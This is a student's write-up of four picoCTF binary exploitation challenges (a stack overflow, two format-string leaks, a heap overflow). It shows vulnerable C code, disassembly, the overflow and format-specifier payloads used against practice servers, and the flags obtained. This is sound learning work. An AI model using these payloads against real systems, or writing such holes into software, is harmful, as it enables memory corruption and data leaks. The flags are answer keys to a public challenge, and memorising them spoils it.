# Binary_Exploitation
## Challenge 1: Buffer Overflow 0
I started off by checking the file details of the source and program files as I wasn’t sure of how to begin. 
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % file vuln
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % file vuln.c
vuln.c: c program text, ASCII text

Then I viewed the assembly code
```
(lldb) target create vuln
Current executable set to '/Users/mahikakapil/cryptonite_tp2_Mahika/vuln' (i386).
(lldb) disassemble -n main
vuln`main:
vuln[0x1382] <+0>:   endbr32 
vuln[0x1386] <+4>:   leal   0x4(%esp), %ecx
vuln[0x138a] <+8>:   andl   $-0x10, %esp
vuln[0x138d] <+11>:  pushl  -0x4(%ecx)
vuln[0x1390] <+14>:  pushl  %ebp
vuln[0x1391] <+15>:  movl   %esp, %ebp
vuln[0x1393] <+17>:  pushl  %ebx
vuln[0x1394] <+18>:  pushl  %ecx
vuln[0x1395] <+19>:  subl   $0x70, %esp
vuln[0x1398] <+22>:  calll  0x1210                    ; __x86.get_pc_thunk.bx
vuln[0x139d] <+27>:  addl   $0x2c0f, %ebx             ; imm = 0x2C0F 
vuln[0x13a3] <+33>:  subl   $0x8, %esp
vuln[0x13a6] <+36>:  leal   -0x1fa4(%ebx), %eax
vuln[0x13ac] <+42>:  pushl  %eax
vuln[0x13ad] <+43>:  leal   -0x1fa2(%ebx), %eax
vuln[0x13b3] <+49>:  pushl  %eax
vuln[0x13b4] <+50>:  calll  0x11b0                    ;  + 160
vuln[0x13b9] <+55>:  addl   $0x10, %esp
vuln[0x13bc] <+58>:  movl   %eax, -0xc(%ebp)
vuln[0x13bf] <+61>:  cmpl   $0x0, -0xc(%ebp)
vuln[0x13c3] <+65>:  jne    0x13ef                    ; <+109>
vuln[0x13c5] <+67>:  subl   $0x4, %esp
vuln[0x13c8] <+70>:  leal   -0x1f99(%ebx), %eax
vuln[0x13ce] <+76>:  pushl  %eax
vuln[0x13cf] <+77>:  leal   -0x1f84(%ebx), %eax
vuln[0x13d5] <+83>:  pushl  %eax
vuln[0x13d6] <+84>:  leal   -0x1f4f(%ebx), %eax
vuln[0x13dc] <+90>:  pushl  %eax
vuln[0x13dd] <+91>:  calll  0x1110
vuln[0x13e2] <+96>:  addl   $0x10, %esp
vuln[0x13e5] <+99>:  subl   $0xc, %esp
vuln[0x13e8] <+102>: pushl  $0x0
vuln[0x13ea] <+104>: calll  0x1190                    ;  + 128
vuln[0x13ef] <+109>: subl   $0x4, %esp
vuln[0x13f2] <+112>: pushl  -0xc(%ebp)
vuln[0x13f5] <+115>: pushl  $0x40
vuln[0x13f7] <+117>: leal   0x94(%ebx), %eax
vuln[0x13fd] <+123>: pushl  %eax
vuln[0x13fe] <+124>: calll  0x1140                    ;  + 48
vuln[0x1403] <+129>: addl   $0x10, %esp
vuln[0x1406] <+132>: subl   $0x8, %esp
vuln[0x1409] <+135>: leal   -0x2c9f(%ebx), %eax
vuln[0x140f] <+141>: pushl  %eax
vuln[0x1410] <+142>: pushl  $0xb
vuln[0x1412] <+144>: calll  0x1150                    ;  + 64
vuln[0x1417] <+149>: addl   $0x10, %esp
vuln[0x141a] <+152>: calll  0x1160                    ;  + 80
vuln[0x141f] <+157>: movl   %eax, -0x10(%ebp)
vuln[0x1422] <+160>: subl   $0x4, %esp
vuln[0x1425] <+163>: pushl  -0x10(%ebp)
vuln[0x1428] <+166>: pushl  -0x10(%ebp)
vuln[0x142b] <+169>: pushl  -0x10(%ebp)
vuln[0x142e] <+172>: calll  0x11c0                    ;  + 176
vuln[0x1433] <+177>: addl   $0x10, %esp
vuln[0x1436] <+180>: subl   $0xc, %esp
vuln[0x1439] <+183>: leal   -0x1f49(%ebx), %eax
vuln[0x143f] <+189>: pushl  %eax
vuln[0x1440] <+190>: calll  0x1110
vuln[0x1445] <+195>: addl   $0x10, %esp
vuln[0x1448] <+198>: movl   0x48(%ebx), %eax
vuln[0x144e] <+204>: movl   (%eax), %eax
vuln[0x1450] <+206>: subl   $0xc, %esp
vuln[0x1453] <+209>: pushl  %eax
vuln[0x1454] <+210>: calll  0x1120                    ;  + 16
vuln[0x1459] <+215>: addl   $0x10, %esp
vuln[0x145c] <+218>: subl   $0xc, %esp
vuln[0x145f] <+221>: leal   -0x74(%ebp), %eax
vuln[0x1462] <+224>: pushl  %eax
vuln[0x1463] <+225>: calll  0x1130                    ;  + 32
vuln[0x1468] <+230>: addl   $0x10, %esp
vuln[0x146b] <+233>: subl   $0xc, %esp
vuln[0x146e] <+236>: leal   -0x74(%ebp), %eax
vuln[0x1471] <+239>: pushl  %eax
vuln[0x1472] <+240>: calll  0x1353                    ; vuln
vuln[0x1477] <+245>: addl   $0x10, %esp
vuln[0x147a] <+248>: subl   $0xc, %esp
vuln[0x147d] <+251>: leal   -0x1f41(%ebx), %eax
vuln[0x1483] <+257>: pushl  %eax
vuln[0x1484] <+258>: calll  0x1180                    ;  + 112
vuln[0x1489] <+263>: addl   $0x10, %esp
vuln[0x148c] <+266>: movl   $0x0, %eax
vuln[0x1491] <+271>: leal   -0x8(%ebp), %esp
vuln[0x1494] <+274>: popl   %ecx
vuln[0x1495] <+275>: popl   %ebx
vuln[0x1496] <+276>: popl   %ebp
vuln[0x1497] <+277>: leal   -0x4(%ecx), %esp
vuln[0x149a] <+280>: retl   
```
I also tried connecting to the program using `nc saturn.picoctf.net 53460` which gave a prompt for input and then exited. 
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % nc saturn.picoctf.net 53460
Input: hello
The program will exit now
```
Then I decided to analyze the program.
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```
Here, the function vuln takes an input in the array buf2 of maximum 16 characters. So I inputted more than 16 random characters and got the flag by overflowing the buffer. The assembly code didn’t really come in use here.
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % nc saturn.picoctf.net 54932
Input: djakcnjIJSDCAJCJNDJLdjnjljcjhdhafhijldadefrefdsfghytrf
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```


-Errors and mistakes:
1. I ran the command `lldb vuln.c ` but this resulted in the following error:
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % lldb vuln.c     
(lldb) target create "vuln.c"
error: '/Users/mahikakapil/cryptonite_tp2_Mahika/vuln.c' doesn't contain any 'host' platform architectures: arm64, armv7, armv7f, armv7k, armv7s, armv7m, armv7em, armv6m, armv6, armv5, armv4, arm, thumbv7, thumbv7k, thumbv7s, thumbv7f, thumbv7m, thumbv7em, thumbv6m, thumbv6, thumbv5, thumbv4t, thumb, x86_64, x86_64, arm64, arm64e, arm64, arm64e
``` 
I had to use the source code file instead as it was an ELF file. Later, I realized that this challenge could be done without the assembly code.

FLAG: picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}

## Challenge 2:   Format string 0
To start off, I used the netcat command provided in the challenge description`nc mimas.picoctf.net 57587` on terminal to connect with the challenge instance. This gave the following output:
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % nc mimas.picoctf.net 57587
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: 
```
Then I decided to take a look at the c program to understand what the code is about. 
￼
This part of the code caught my eye. I had to input a recommendation whose size would be greater than 2* BUFSIZE that is 64 bytes. So I entered `Gr%114d_Cheese` which had a format specifier %114d which added 114 whitespaces in the output. The code then ran the serve_bob() function.

```
Enter your recommendation:  Gr%114d_Cheese
Gr                                                                                                           
                               4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: 
```
￼
Here, I entered Cla%sic_Che%s%steak as the recommendation as it had 3 string format specifiers %s which I thought would print the flag.
```
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```

FLAG: picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}

## Challenge 3: flag leak
I started off by launching the instance and connecting to it using `nc saturn.picoctf.net 49965`. 
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika %  nc saturn.picoctf.net 49965 
Tell me a story and then I'll tell you one >> 
```
The hint given for this challenge was ”format strings”. So I tried inputting string, hexadecimal and memory address format specifiers.
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % nc saturn.picoctf.net 54595
Tell me a story and then I'll tell you one >> %s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s
Here's a story - 
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % nc saturn.picoctf.net 54595
Tell me a story and then I'll tell you one >> %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Here's a story - 
ffcd5500.ffcd5520.8049346.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.7825
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % nc saturn.picoctf.net 60397
Tell me a story and then I'll tell you one >> %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Here's a story - 
0xffc8af20.0xffc8af40.0x8049346.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x8007025.0xf1206990.0xffc8afa4.0xf1206b50
```
Okay so %p was printing the addresses of random data on the stack. This way we could get the location of the flag.
I decided to take a look at the program.
<img width="563" alt="Pasted Graphic 9" src="https://github.com/user-attachments/assets/49a623a4-a24f-442e-9eba-c1c44dbeafcf">

￼
The function read flag is where the flag is stored. So, I decided to disassemble the program using lldb.
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % gcc vuln.c
vuln.c:32:11: warning: format string is not a string literal (potentially insecure) [-Wformat-security]
   printf(story);
          ^~~~~
vuln.c:32:11: note: treat the string as an argument to avoid this
   printf(story);
          ^
          "%s", 
1 warning generated.
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % ./a.out
Please create 'flag.txt' in this directory with your own debugging flag.
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % gcc -g vuln.c
vuln.c:32:11: warning: format string is not a string literal (potentially insecure) [-Wformat-security]
   printf(story);
          ^~~~~
vuln.c:32:11: note: treat the string as an argument to avoid this
   printf(story);
          ^
          "%s", 
1 warning generated.
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % lldb a.out
(lldb) target create "a.out"
Current executable set to '/Users/mahikakapil/cryptonite_tp2_Mahika/a.out' (arm64).
```
Now to disassemble the functions in vuln.c:
```
(lldb) disassemble -a main
a.out`main:
    0x100003e30 <+0>:  sub    sp, sp, #0x30
    0x100003e34 <+4>:  stp    x29, x30, [sp, #0x20]
    0x100003e38 <+8>:  add    x29, sp, #0x20
    0x100003e3c <+12>: mov    w8, #0x0
    0x100003e40 <+16>: str    w8, [sp, #0x8]
    0x100003e44 <+20>: stur   wzr, [x29, #-0x4]
    0x100003e48 <+24>: stur   w0, [x29, #-0x8]
    0x100003e4c <+28>: str    x1, [sp, #0x10]
    0x100003e50 <+32>: adrp   x8, 1
    0x100003e54 <+36>: ldr    x8, [x8, #0x10]
    0x100003e58 <+40>: ldr    x0, [x8]
    0x100003e5c <+44>: mov    x1, #0x0
    0x100003e60 <+48>: mov    w2, #0x2
    0x100003e64 <+52>: mov    x3, #0x0
    0x100003e68 <+56>: bl     0x100003ef4               ; symbol stub for: setvbuf
    0x100003e6c <+60>: bl     0x100003ec4               ; symbol stub for: getegid
    0x100003e70 <+64>: str    w0, [sp, #0xc]
    0x100003e74 <+68>: ldr    w0, [sp, #0xc]
    0x100003e78 <+72>: ldr    w1, [sp, #0xc]
    0x100003e7c <+76>: bl     0x100003ee8               ; symbol stub for: setregid
->  0x100003e80 <+80>: bl     0x100003d90               ; vuln at vuln.c:23
    0x100003e84 <+84>: ldr    w0, [sp, #0x8]
    0x100003e88 <+88>: ldp    x29, x30, [sp, #0x20]
    0x100003e8c <+92>: add    sp, sp, #0x30
    0x100003e90 <+96>: ret    
(lldb) disassemble -a vuln
a.out`vuln:
    0x100003d90 <+0>:   sub    sp, sp, #0xf0
    0x100003d94 <+4>:   stp    x29, x30, [sp, #0xe0]
    0x100003d98 <+8>:   add    x29, sp, #0xe0
    0x100003d9c <+12>:  adrp   x8, 1
    0x100003da0 <+16>:  ldr    x8, [x8, #0x8]
    0x100003da4 <+20>:  ldr    x8, [x8]
    0x100003da8 <+24>:  stur   x8, [x29, #-0x8]
    0x100003dac <+28>:  sub    x0, x29, #0x48
    0x100003db0 <+32>:  mov    x1, #0x40
    0x100003db4 <+36>:  bl     0x100003d00               ; readflag at vuln.c:12
    0x100003db8 <+40>:  adrp   x0, 0
    0x100003dbc <+44>:  add    x0, x0, #0xf5b            ; "Tell me a story and then I'll tell you one >> "
    0x100003dc0 <+48>:  bl     0x100003ed0               ; symbol stub for: printf
    0x100003dc4 <+52>:  mov    x9, sp
    0x100003dc8 <+56>:  add    x8, sp, #0x18
    0x100003dcc <+60>:  str    x8, [sp, #0x10]
    0x100003dd0 <+64>:  str    x8, [x9]
    0x100003dd4 <+68>:  adrp   x0, 0
    0x100003dd8 <+72>:  add    x0, x0, #0xf8a            ; "%127s"
    0x100003ddc <+76>:  bl     0x100003edc               ; symbol stub for: scanf
    0x100003de0 <+80>:  adrp   x0, 0
    0x100003de4 <+84>:  add    x0, x0, #0xf90            ; "Here's a story - \n"
    0x100003de8 <+88>:  bl     0x100003ed0               ; symbol stub for: printf
    0x100003dec <+92>:  ldr    x0, [sp, #0x10]
    0x100003df0 <+96>:  bl     0x100003ed0               ; symbol stub for: printf
    0x100003df4 <+100>: adrp   x0, 0
    0x100003df8 <+104>: add    x0, x0, #0xfa3            ; "'\n'"
    0x100003dfc <+108>: bl     0x100003ed0               ; symbol stub for: printf
    0x100003e00 <+112>: ldur   x9, [x29, #-0x8]
    0x100003e04 <+116>: adrp   x8, 1
    0x100003e08 <+120>: ldr    x8, [x8, #0x8]
    0x100003e0c <+124>: ldr    x8, [x8]
    0x100003e10 <+128>: subs   x8, x8, x9
    0x100003e14 <+132>: cset   w8, eq
    0x100003e18 <+136>: tbnz   w8, #0x0, 0x100003e24     ; <+148> at vuln.c:34:1
    0x100003e1c <+140>: b      0x100003e20               ; <+144> at vuln.c:34:1
    0x100003e20 <+144>: bl     0x100003e94               ; symbol stub for: __stack_chk_fail
    0x100003e24 <+148>: ldp    x29, x30, [sp, #0xe0]
    0x100003e28 <+152>: add    sp, sp, #0xf0
    0x100003e2c <+156>: ret    
(lldb) disassemble -a readflag
a.out`readflag:
    0x100003d00 <+0>:   sub    sp, sp, #0x40
    0x100003d04 <+4>:   stp    x29, x30, [sp, #0x30]
    0x100003d08 <+8>:   add    x29, sp, #0x30
    0x100003d0c <+12>:  stur   x0, [x29, #-0x8]
    0x100003d10 <+16>:  stur   x1, [x29, #-0x10]
    0x100003d14 <+20>:  adrp   x0, 0
    0x100003d18 <+24>:  add    x0, x0, #0xf00            ; "flag.txt"
    0x100003d1c <+28>:  adrp   x1, 0
    0x100003d20 <+32>:  add    x1, x1, #0xf09            ; "'r'"
    0x100003d24 <+36>:  bl     0x100003eb8               ; symbol stub for: fopen
    0x100003d28 <+40>:  str    x0, [sp, #0x18]
    0x100003d2c <+44>:  ldr    x8, [sp, #0x18]
    0x100003d30 <+48>:  subs   x8, x8, #0x0
    0x100003d34 <+52>:  cset   w8, ne
    0x100003d38 <+56>:  tbnz   w8, #0x0, 0x100003d70     ; <+112> at vuln.c:20:9
    0x100003d3c <+60>:  b      0x100003d40               ; <+64> at vuln.c:15:5
    0x100003d40 <+64>:  mov    x9, sp
    0x100003d44 <+68>:  adrp   x8, 0
    0x100003d48 <+72>:  add    x8, x8, #0xf11            ; "Please create 'flag.txt' in this directory with your"
    0x100003d4c <+76>:  str    x8, [x9]
    0x100003d50 <+80>:  adrp   x8, 0
    0x100003d54 <+84>:  add    x8, x8, #0xf46            ; "own debugging flag.\n"
    0x100003d58 <+88>:  str    x8, [x9, #0x8]
    0x100003d5c <+92>:  adrp   x0, 0
    0x100003d60 <+96>:  add    x0, x0, #0xf0b            ; "%s %s"
    0x100003d64 <+100>: bl     0x100003ed0               ; symbol stub for: printf
    0x100003d68 <+104>: mov    w0, #0x0
    0x100003d6c <+108>: bl     0x100003ea0               ; symbol stub for: exit
    0x100003d70 <+112>: ldur   x0, [x29, #-0x8]
    0x100003d74 <+116>: ldur   x8, [x29, #-0x10]
    0x100003d78 <+120>: mov    x1, x8
    0x100003d7c <+124>: ldr    x2, [sp, #0x18]
    0x100003d80 <+128>: bl     0x100003eac               ; symbol stub for: fgets
    0x100003d84 <+132>: ldp    x29, x30, [sp, #0x30]
    0x100003d88 <+136>: add    sp, sp, #0x40
    0x100003d8c <+140>: ret    
(lldb) quit
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y
```
On analyzing this assembly code we can see that in the vuln function, the readflag function is being called at 36bytes.  `0x100003db4 <+36>:  bl     0x100003d00               ; readflag at vuln.c:12`. So I tried getting the memory address of a bunch of values from the 36th value.
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % nc saturn.picoctf.net 56723
Tell me a story and then I'll tell you one >> %36$p.%37$p.%38$p.%39$p.%40$p.%41$p.%42$p.%43$p.%44$p.%45$p.%46$p.%47$p
Here's a story - 
0x6f636970.0x7b465443.0x6b34334c.0x5f676e31.0x67346c46.0x6666305f.0x3474535f.0x315f6b63.0x62326131.0x7d613235.0xfbad2000.0x848f0100
```
Then I converted the hexadecimal text to ascii text using an online converter.

<img width="675" alt="Hex to ASCIl Text String Converter" src="https://github.com/user-attachments/assets/0bf5e850-1f6e-4aa5-b156-9a62790a9c5e">
  
￼I then rearranged the hex numbers.

<img width="662" alt="Hexadecimal" src="https://github.com/user-attachments/assets/aaaf92bd-171d-44f3-b32f-f470a88824c5">

Then I reversed the string using a python code and got the flag

<img width="1121" alt="Pasted Graphic 12" src="https://github.com/user-attachments/assets/3c07d62d-e764-49b3-b8f6-070c9c542c1d">

-Errors and Mistakes
1. While trying clang compiler to compile vuln.c, the following errors were raised. 
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % clang vuln.c
vuln.c:32:11: warning: format string is not a string literal (potentially insecure) [-Wformat-security]
   printf(story);
          ^~~~~
vuln.c:32:11: note: treat the string as an argument to avoid this
   printf(story);
          ^
          "%s", 
vuln.c:43:3: error: call to undeclared function 'setresgid'; ISO C99 and later do not support implicit function declarations [-Wimplicit-function-declaration]
  setresgid(gid, gid, gid);
  ^
vuln.c:43:3: note: did you mean 'setregid'?
/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/unistd.h:593:6: note: 'setregid' declared here
int      setregid(gid_t, gid_t) __DARWIN_ALIAS(setregid);
         ^
1 warning and 1 error generated.
```
Since setresgid is not supported on macOS I changed it to setregid in the vuln.c file and then compiled it using gcc.

-References
1. [LLDB debugging 1](https://gist.github.com/wanyakun/314690093ea195d749fca6869ebf200e)
2. [LLDB debugging 2](https://lldb.llvm.org/use/tutorial.html)
 
FLAG: picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}

## Challenge 4: Heap 0
I started launching the instance and connecting to it. This gave the following output:
```
mahikakapil@Mahikas-MacBook-Air cryptonite_tp2_Mahika % nc tethys.picoctf.net 52121

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5de2312c92b0  ->   pico
+-------------+----------------+
[*]   0x5de2312c92d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit
Enter your choice: 
```
Before entering a choice, I decided to take a look at the code.
￼
<img width="648" alt="Pasted Graphic 16" src="https://github.com/user-attachments/assets/a0de5907-1edd-4a2c-824f-851c13b0ccee">


Looking at the body of the function check_win() it can be seen that the winning condition is safe_var not having the value “bico”. This would print the flag. So our goal is to change the value stored in safe_var.

<img width="642" alt="Pasted Graphic 15" src="https://github.com/user-attachments/assets/5fc06389-bf14-4fbf-933d-f26ec864a2f0">
￼

Okay so the values for the variables input_data and safe_var are “pico” and “bico” respectively which are specified in init(). The write_buffer function asks for the user to input data to the variable input_data. Which means we cannot directly change the value of safe_var. Coming back to terminal, I entered 2 as my choice to write data to input_data. I typed random number of characters which would exceed the memory limit for input_data.

```
Enter your choice: 2
Data for buffer: CNJDHFERJKDWNSXBHCDGVFYREUIWJSDNBHCGVFERYDJSWXBDGVCFTEYWJSBXCVFN

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit
```
I entered 1 to view the heap.
```
Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x64f5a49e02b0  ->   CNJDHFERJKDWNSXBHCDGVFYREUIWJSDNBHCGVFERYDJSWXBDGVCFTEYWJSBXCVFN1
JDHFERJKDWNSXBHCDGVFYREUIWJSDNBHCGVFERYDJSWXBDGVCFTEYWJSBXCVFN

+-------------+----------------+
[*]   0x64f5a49e02d0  ->   BHCGVFERYDJSWXBDGVCFTEYWJSBXCVFN1
JDHFERJKDWNSXBHCDGVFYREUIWJSDNBHCGVFERYDJSWXBDGVCFTEYWJSBXCVFN

+-------------+----------------+

```
The data overflowed from input_data to safe_var. Then I entered 3 as my choice to look at the changed value of safe_var. Finally the flag was printed by entering 4 as my choice.

```
1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = BHCGVFERYDJSWXBDGVCFTEYWJSBXCVFN3
JDHFERJKDWNSXBHCDGVFYREUIWJSDNBHCGVFERYDJSWXBDGVCFTEYWJSBXCVFN



1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_c3935a08}
```

FLAG: picoCTF{my_first_heap_overflow_c3935a08}


